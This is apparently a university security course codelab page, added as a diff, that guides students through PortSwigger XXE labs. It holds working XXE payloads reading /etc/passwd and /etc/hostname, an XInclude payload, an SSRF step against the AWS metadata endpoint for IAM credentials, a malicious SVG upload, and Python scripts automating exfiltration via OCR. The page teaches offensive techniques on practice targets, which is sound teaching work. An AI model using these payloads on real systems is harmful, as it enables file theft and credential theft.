@@ -1,0 +1,165 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>2.3: XXE</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W2.3_xxe" title="2.3: XXE" environment="web" feedback-link="https://docs.google.com/document/d/1a35r84x6_BmQHNevwKmnUBj3CjDZCXpYufk1Udnumc8">
+<google-codelab-step label="xxe (1)" duration="5">
+<p>When an application uses an XML file to pass information from client to server, it gives an adversary the ability to leverage the XML format to include malicious content. XML eXternal Entities (XXE) is a mechanism for XML files to include content from other sources, including files in the file system and files over the network via their URLs. The following exercises will have you leverage this vulnerability to gain unauthorized access to the server running a web application. For each exercise, show a screenshot of its completion with your OdinID</p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank">exploiting-xxe-to-retrieve-files</a></h2>
+<h3 is-upgraded>Examining application</h3>
+<p>To begin with, visit a product&#39;s page and bring up Developer Tools. Click on the &#34;Check stock&#34; button and examine the request that is submitted. As part of the POST, view the payload that is sent and its response</p>
+<p class="image-container"><img style="width:624px" src="img/826cb398a222730c.png"></p>
+<p class="image-container"><img style="width:624px" src="img/90726e4d39d7edc0.png"></p>
+<p>Similar to the SSRF levels, the payload specifies the <code>storeId</code> and <code>productId</code> of the item that is being checked. A Python script for performing the function is shown below. Fill in the fields based on the request you have examined to ensure you get the same results.</p>
+<pre><code># &lt;FMI&gt; (Fill Me In) denotes a value you will need to modify
+stock_url = &#39;&lt;FMI&gt;&#39;
+xml_post_data = &#39;&lt;FMI&gt;&#39;
+
+resp = s.post(stock_url,data=xml_post_data)
+print(resp.text)</code></pre>
+<p class="image-container"><img style="width:624px" src="img/28fd7005e4ed2d7.png"></p>
+<h3 is-upgraded>Exploiting vulnerability</h3>
+<p>A basic XXE attack involves retrieving the contents of a sensitive file from the server. If unsanitized XML input is accepted from the client, then the client can use the format to include arbitrary files such <code>/etc/passwd</code> as shown below. In this XML file, an entity called <code>xxe</code> is defined as part of the document definition <code>foo</code>. It is set to the contents of <code>/etc/passwd</code>. Then, within the XML, the entity is instantiated, leading to the exfiltration of the file. Fill in the XML below with the missing part of the payload (&lt;<code>FMI</code>&gt;) and include it in your script.</p>
+<pre><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt; &lt;FMI&gt; &lt;/stockCheck&gt;</code></pre>
+<p>Submit the XML to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="xxe (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank">exploiting-xxe-to-perform-ssrf</a></h2>
+<p>XXE can not only force a server to include local files, it can also force a server to retrieve files from arbitrary web servers including those run within a company&#39;s protected infrastructure. Such attacks are known as server-side request forgery (SSRF) attacks. For example, the payload below can force the server to contact a sensitive server housed internally such as a cloud project&#39;s <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">metadata</a>. </p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;http://internal.vulnerable-website.com/&#34;&gt; ]&gt;</code></pre>
+<p>For example, on AWS, one might attempt to retrieve the security credentials of the admin account via <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" target="_blank"><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</code></a>.</p>
+<p>Perform the SSRF attack to retrieve these credentials.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="xxe (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" target="_blank">xinclude-attack</a></h2>
+<p>In previous exercises, the XXE injection occurs directly within an XML document that the server then returns. XXE, however, can occur anywhere within request processing, including during its error handling routines. Consider a server that attempts to process XML given to it by a client such as the one below. The XML code uses <code>XInclude</code> to specify a sensitive file on the server to include.</p>
+<pre><code>&lt;foo xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34;&gt;
+  &lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/passwd&#34;/&gt;
+&lt;/foo&gt;</code></pre>
+<p>Assuming the <code>/etc/passwd</code> file is not valid XML, it will then cause an error in its handling. If the error messages from this processing are not properly sanitized, it is possible that the contents of the file are then emitted back to the client as an error message. </p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="xxe (4)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" target="_blank">xxe-via-file-upload</a></h2>
+<p>There are several common file formats that use the XML format for encoding. One such format is the Scalable Vector Graphics (SVG) image format. Below is an example of an SVG file. Change &lt;<code>FMI</code>&gt; to your OdinID and save it in a file in the filesystem with the <code>.svg</code> extension. Open the file in a web browser to view the image.</p>
+<pre><code>&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;
+&lt;svg width=&#34;128px&#34; height=&#34;128px&#34; 
+  xmlns=&#34;http://www.w3.org/2000/svg&#34;
+  xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; version=&#34;1.1&#34;&gt;
+  &lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;FMI&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+<p class="image-container"><img style="width:457px" src="img/339a1f38d781d301.png"></p>
+<p>The level website implements a blog that allows users to post comments that also include an avatar they can upload. The avatar is in the SVG format, but upon upload, it is converted into a PNG (Portable Network Graphics) file for use on the site. Visit the site and view a blog post. Examine the form for submitting a comment below.</p>
+<pre><code>&lt;form action=&#34;/post/comment&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+    &lt;input required type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;0zuD...od&#34;&gt;
+    &lt;input required type=&#34;hidden&#34; name=&#34;postId&#34; value=&#34;5&#34;&gt;
+
+  &lt;label&gt;Comment:&lt;/label&gt;
+    &lt;textarea required rows=&#34;12&#34; cols=&#34;300&#34; name=&#34;comment&#34;&gt;&lt;/textarea&gt;
+  &lt;label&gt;Name:&lt;/label&gt;
+    &lt;input required type=&#34;text&#34; name=&#34;name&#34;&gt;
+  &lt;label&gt;Avatar:&lt;/label&gt;
+    &lt;input type=&#34;file&#34; name=&#34;avatar&#34;&gt;
+  &lt;label&gt;Email:&lt;/label&gt;
+    &lt;input required type=&#34;email&#34; name=&#34;email&#34;&gt;
+  &lt;label&gt;Website:&lt;/label&gt;
+    &lt;input pattern=&#34;(http:|https:).+&#34; type=&#34;text&#34; name=&#34;website&#34;&gt;
+  &lt;button class=&#34;button&#34; type=&#34;submit&#34;&gt;Post Comment&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+<p>Because the form allows file uploads, it uses the <code>multipart/form-data</code> encoding. The Python script below shows an example of posting to this form using the format. Modify it with the <code>postId</code> of the blog post you&#39;re on, your own PSU information, and the location of the SVG file created in the previous step to submit a comment using the avatar created.</p>
+<pre><code>post_url = f&#39;https://{site}/post?postId=&lt;FMI&gt;&#39;
+resp = s.get(post_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+comment_url = f&#39;https://{site}/post/comment&#39;
+
+multipart_form_data = {
+    &#39;csrf&#39; : (None, csrf),
+    &#39;postId&#39; : (None, &#39;&lt;FMI&gt;&#39;),
+    &#39;comment&#39; : (None, &#39;Nice blog.  Be a shame if anything happened to it.&#39;),
+    &#39;name&#39; : (None, &#39;Wu&#39;),
+    &#39;email&#39; : (None, &#39;wuchang@pdx.edu&#39;),
+    &#39;website&#39;: (None, &#39;https://pdx.edu&#39;),
+    &#39;avatar&#39; : (&#39;avatar.svg&#39;, open(&#39;&lt;FMI&gt;.svg&#39;, &#39;rb&#39;))
+}
+
+resp = s.post(comment_url, files=multipart_form_data)</code></pre>
+<p>View the comment in the blog, right-click the avatar image, and open it in a new tab. </p>
+<ul>
+<li><strong>Take a screenshot of the image URL and the image for your lab notebook</strong></li>
+</ul>
+<p class="image-container"><img style="width:624px" src="img/d69c2b7ee3ec5fca.png"></p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="10">
+<p>We can now craft our exploit. Consider the following malicious SVG image containing an XXE payload can cause sensitive data to be exfiltrated. In this case, the SVG file causes the XML parser on the server to include the hostname of the server that hosts it. It could easily have included <code>/etc/passwd</code>.</p>
+<pre><code>&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt; ]&gt;
+&lt;svg width=&#34;128px&#34; height=&#34;128px&#34; 
+  xmlns=&#34;http://www.w3.org/2000/svg&#34;
+  xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; version=&#34;1.1&#34;&gt;
+  &lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+<p>Use the Python script to upload a comment that contains this SVG payload file as its avatar. </p>
+<p>While we could simply view the avatar attached to the comment directly on the web site after uploading it to solve this level, that wouldn&#39;t be quite as fun as modifying the Python program to do so automatically. To do so, install <code>tesseract-ocr</code> and then the Python package interface to it <code>pytesseract</code>. On a Linux system, this can be done via the following:</p>
+<pre><code>sudo apt install tesseract-ocr
+source env/bin/activate
+pip install pytesseract</code></pre>
+<p>Consider the Python snippet below that uses the Python Pillow (<code>PIL</code>) image processing package and the Python <code>pytesseract</code> optical character recognition package to automatically process the PNG version of the avatar on the site. Given the URL of the blog post the comment has been submitted to, the program uses a regular expression to search for embedded images that are PNG files and obtains their URLs. Assuming only one comment with an avatar has been submitted, it then downloads the image and uses PIL&#39;s <code>Image</code> class to read it in. The resulting image is then sent to <code>pytesseract</code> to extract the string that it contains (e.g. the exfiltrated hostname). Finally, we strip any trailing spaces if the tesseract package returns them.</p>
+<pre><code>from PIL import Image
+import pytesseract
+import re
+from io import BytesIO
+
+resp = s.get(post_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+avatar_path = soup.find_all(&#39;img&#39;, src=re.compile(r&#39;png$&#39;))[0].get(&#39;src&#39;)
+avatar_url = f&#39;https://{site}{avatar_path}&#39;
+print(avatar_url)
+
+# Use OCR package (Tesseract) to extract hostname
+hostname = pytesseract.image_to_string(Image.open(BytesIO(requests.get(avatar_url).content)))
+
+hostname = hostname.strip()
+print(f&#39;Exfiltrated hostname: {hostname}&#39;)</code></pre>
+<p>Finally, given the hostname, the snippet below will submit it to the site to solve the level.</p>
+<pre><code># Submit to solution URL
+solution_url = f&#39;https://{site}/submitSolution&#39;                                 
+solution_data = {                
+    &#39;answer&#39; : hostname
+}    
+s.post(solution_url, data=solution_data)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
